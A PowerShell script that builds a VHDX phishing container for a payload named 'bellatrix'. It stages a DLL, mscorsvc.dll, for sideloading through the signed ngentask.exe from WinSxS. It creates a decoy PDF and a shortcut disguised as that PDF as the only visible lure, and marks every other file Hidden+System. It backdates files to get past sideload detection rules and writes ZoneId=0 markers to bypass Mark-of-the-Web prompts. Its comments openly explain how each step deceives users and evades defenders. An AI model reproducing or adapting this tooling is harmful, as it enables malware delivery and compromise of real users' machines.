<#
.SYNOPSIS
    Package bellatrix as a VHDX with a single visible lure.

.DESCRIPTION
    Builds a volume that looks like a folder holding one document. Everything
    but the shortcut carries Hidden+System, which is what keeps it invisible
    even with "show hidden files" on -- Explorer hides protected OS files
    under a separate option most people never touch.

    The carrier opens the decoy at run time, so the document does not need to
    be visible in the folder to be seen. The shortcut displays under the PDF
    name with the PDF icon, because "hide extensions for known file types"
    strips .lnk and leaves .pdf.

    The host stays in WinSxS: the shortcut targets its system path and nothing
    executable is dropped. The proxy is pre-positioned and aged so the
    recency window in the sideload rules never applies.

.PARAMETER VhdPath
    Where to write the image. Extension decides the format: .vhdx or .vhd.

.PARAMETER HostExe
    Path to the signed host. Resolved automatically when omitted.

.PARAMETER AgeDays
    How far back to set the file times on the proxy and the decoy. The
    sideload rules only fire on files touched within their recency window.
#>
[CmdletBinding()]
param(
    [Parameter(Mandatory)] [string]$VhdPath,
    [string]$OutDir      = ".\out",
    [string]$DllPath     = "..\bin\mscorsvc.dll",
    [string]$DecoyPdf    = "",
    [string]$LnkBaseName = "test",
    [string]$HostExe     = "",
    [string]$HostArgs    = "/executeQueuedItems",
    [int]   $SizeMB      = 32,
    [int]   $AgeDays     = 120
)

$ErrorActionPreference = 'Stop'

function Resolve-FromScript([string]$p) {
    if ([IO.Path]::IsPathRooted($p)) { return $p }
    return [IO.Path]::GetFullPath((Join-Path $PSScriptRoot $p))
}

function Find-Host {
    # ngentask.exe lives in WinSxS under a versioned assembly directory. Take
    # the newest: the path is what the shortcut pins, and an update can retire
    # an older one. foreach + return, not ForEach-Object: return inside a
    # pipeline script block only exits that iteration.
    $root = Join-Path $env:SystemRoot 'WinSxS'
    $dirs = Get-ChildItem $root -Directory -Filter 'amd64_netfx4-ngentask_exe_*' -ErrorAction SilentlyContinue |
        Sort-Object Name -Descending
    foreach ($d in $dirs) {
        $p = Join-Path $d.FullName 'ngentask.exe'
        if (Test-Path $p) { return $p }
    }
    return $null
}

function New-MinimalPdf([string]$Path, [string]$Title) {
    $objs = @(
        '<</Type/Catalog/Pages 2 0 R>>',
        '<</Type/Pages/Kids[3 0 R]/Count 1>>',
        '<</Type/Page/Parent 2 0 R/MediaBox[0 0 612 792]/Contents 4 0 R/Resources<</Font<</F1 5 0 R>>>>>>',
        $null,
        '<</Type/Font/Subtype/Type1/BaseFont/Helvetica>>'
    )
    $stream = "BT /F1 18 Tf 72 720 Td ($Title) Tj ET"
    $objs[3] = "<< /Length $($stream.Length) >>stream`n$stream`nendstream"

    $pdf = "%PDF-1.4`n"
    $offsets = @()
    for ($i = 0; $i -lt $objs.Count; $i++) {
        $offsets += $pdf.Length
        $pdf += "$($i + 1) 0 obj$($objs[$i])endobj`n"
    }
    $xref = $pdf.Length
    $pdf += "xref`n0 $($objs.Count + 1)`n0000000000 65535 f `n"
    foreach ($o in $offsets) { $pdf += ("{0:d10} 00000 n " -f $o) + "`n" }
    $pdf += "trailer<</Size $($objs.Count + 1)/Root 1 0 R>>`nstartxref`n$xref`n%%EOF`n"

    [IO.File]::WriteAllText($Path, $pdf, [Text.Encoding]::ASCII)
}

$OutDir   = Resolve-FromScript $OutDir
$DllPath  = Resolve-FromScript $DllPath
$VhdPath  = Resolve-FromScript $VhdPath
if (-not (Test-Path $DllPath)) { throw "carrier not found: $DllPath" }

if (-not $HostExe) {
    $HostExe = Find-Host
    if (-not $HostExe) { throw "ngentask.exe not found under WinSxS; pass -HostExe" }
}
Write-Host "host   : $HostExe"
Write-Host "carrier: $DllPath"

# ---- staging -------------------------------------------------------
$stage = Join-Path $OutDir ("stage-" + [Guid]::NewGuid().ToString('N').Substring(0, 8))
New-Item -ItemType Directory -Force -Path $stage | Out-Null

Copy-Item $DllPath (Join-Path $stage 'mscorsvc.dll')

$decoy = Join-Path $stage "$LnkBaseName.pdf"
if ($DecoyPdf -and (Test-Path (Resolve-FromScript $DecoyPdf))) {
    Copy-Item (Resolve-FromScript $DecoyPdf) $decoy
} else {
    New-MinimalPdf $decoy 'Appendix A - supporting notes'
}

# ---- VHDX ---------------------------------------------------------
$abs = Resolve-FromScript $VhdPath
$dp  = Join-Path $OutDir 'diskpart.txt'
@"
select vdisk file="$abs"
detach vdisk
"@ | Set-Content $dp
@(& diskpart /s $dp 2>&1) | Out-Null
if (Test-Path $abs) { Remove-Item $abs -Force }

@"
create vdisk file="$abs" maximum=$SizeMB type=expandable
select vdisk file="$abs"
attach vdisk
convert mbr
create partition primary
select partition 1
active
format fs=ntfs label="Documents" quick
assign
"@ | Set-Content $dp

Write-Host "creating $([IO.Path]::GetExtension($abs)): $abs"
$dpOut = @(& diskpart /s $dp 2>&1)
if ($dpOut -match '(?i)failed|error|not able|invalid') {
    throw "diskpart reported a failure: $($dpOut -join ' | ')"
}

try {

$letter = $null
# Bind to the image this script just created. Never infer it from "the newest
# file-backed disk": a second mounted image is just as new, and the artefacts
# would land in someone else's volume. Get-DiskImage resolves by path, which is
# the only identifier that is actually unambiguous.
$img = Get-DiskImage -ImagePath $abs -ErrorAction Stop
if (-not $img.Attached) { throw "image is not attached after diskpart: $abs" }
Get-Disk -Number $img.Number | Get-Partition | ForEach-Object {
    if ($_.DriveLetter) { $letter = $_.DriveLetter }
}
if (-not $letter) { throw "no drive letter assigned for $abs" }
$root = "${letter}:\"
Write-Host "root   : $root"

foreach ($f in (Get-ChildItem $stage -Force)) {
    Copy-Item $f.FullName $root
    Write-Host ("  [copy] {0} -> {1} ({2} bytes)" -f $f.Name, $root, $f.Length)
}

# ---- attributes: everything hidden but the lure ---------------------
# Hidden+System marks the file as a protected OS file, which Explorer hides
# under its own option -- "show hidden files" does not reveal it. The decoy is
# hidden too: the carrier opens it at run time, so it does not need to be
# visible in the folder to be seen.
$hidden = @('mscorsvc.dll', "$LnkBaseName.pdf")
foreach ($f in $hidden) {
    [IO.File]::SetAttributes((Join-Path $root $f),
        [IO.FileAttributes]::Hidden -bor
        [IO.FileAttributes]::System -bor
        [IO.FileAttributes]::Archive)
    Write-Host "  [attr] Hidden+System on $f"
}

# ---- age the files -------------------------------------------------
# The sideload rules fire on files created or modified inside a short recency
# window. Pre-positioning is what closes that condition; the volume is not
# mounted at delivery time, so the ages carry across the mount.
$old = (Get-Date).AddDays(-$AgeDays)
foreach ($f in $hidden) {
    $p = Join-Path $root $f
    [IO.File]::SetLastWriteTime($p, $old)
    [IO.File]::SetCreationTime($p, $old)
    Write-Host ("  [time] {0} set to {1:yyyy-MM-dd}" -f $f, $old)
}

# ---- the lure ------------------------------------------------------
# No arguments unless the host needs them, parent will be explorer.exe, and
# the icon comes from the decoy so the item reads as a document.
$lnkPath = Join-Path $root "$LnkBaseName.pdf.lnk"
$sh = New-Object -ComObject WScript.Shell
$lnk = $sh.CreateShortcut($lnkPath)
$lnk.TargetPath       = $HostExe
$lnk.Arguments        = $HostArgs
$lnk.WorkingDirectory = ''
$lnk.IconLocation     = "$LnkBaseName.pdf,0"
$lnk.Description      = 'Appendix A - supporting notes'
$lnk.WindowStyle = 7
$lnk.Save()

# Every file in the volume carries its own zone marker. Without one the shell
# climbs to the container file and the prompt fires from the image's mark
# instead. ZoneId=0 is Local Machine, so the check stops here.
#
# -NoNewline matters: Set-Content appends its own line terminator on top of
# the one already in the value, and the extra blank line is not the canonical
# form of the stream.
$zone = "[ZoneTransfer]`r`nZoneId=0"
foreach ($f in ($hidden + @("$LnkBaseName.pdf.lnk"))) {
    Set-Content -Path (Join-Path $root $f) -Stream 'Zone.Identifier' `
        -Value $zone -NoNewline
}
Write-Host "  [zone] ZoneId=0 baked into every file in the volume"
Write-Host "  [lnk ] $LnkBaseName.pdf.lnk -> $HostExe $HostArgs"

# ---- release -------------------------------------------------------
} finally {
    # Detached unconditionally. A throw above must not leave the image
    # mounted: that is a live volume with the artefacts already on it.
    Set-Content -Path $dp -Value @(
        "select vdisk file=`"$abs`"",
        "detach vdisk"
    )
    @(& diskpart /s $dp 2>&1) | Out-Null
}

Remove-Item $stage -Recurse -Force -ErrorAction SilentlyContinue

Write-Host ""
Write-Host "done: $abs"

# The image carries no Mark of its own. If it arrives with one, the transfer
# put it there and the shell will prompt on mount -- that is a channel
# property, not a packaging one. Removing it here is the correct default;
# a channel that re-marks on arrival still needs a clean channel or an
# Unblock-File on the target.
Unblock-File $abs -ErrorAction SilentlyContinue
Write-Host "image unblocked: $((Get-Item $abs -Stream Zone.Identifier -ErrorAction SilentlyContinue) -eq $null)"

Write-Host "only visible item in the volume:"
Write-Host "  $LnkBaseName.pdf.lnk"
